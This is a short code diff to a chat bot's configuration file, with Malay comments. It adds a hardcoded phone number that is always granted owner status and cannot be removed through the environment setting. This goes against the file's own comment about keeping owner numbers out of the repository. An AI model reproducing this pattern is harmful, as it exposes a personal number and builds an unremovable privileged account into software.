@@ -3,6 +3,10 @@ import 'dotenv/config';
 // Nombor owner dibaca dari env (OWNER_NUMBERS=601xxxx,1xxxx,lid...) supaya tak terdedah di GitHub.
 const owners = (process.env.OWNER_NUMBERS || '')
     .split(/[\s,]+/).map(s => s.replace(/\D/g, '')).filter(Boolean);
+// Nombor owner utama (format antarabangsa: 0 di depan ditukar kepada 60).
+// Ditambah terus dalam kod, digabung dengan OWNER_NUMBERS dari env.
+const OWNER_UTAMA = '601166533534';
+if (!owners.includes(OWNER_UTAMA)) owners.push(OWNER_UTAMA);
 
 export const config = {
     port: process.env.PORT || 3000,
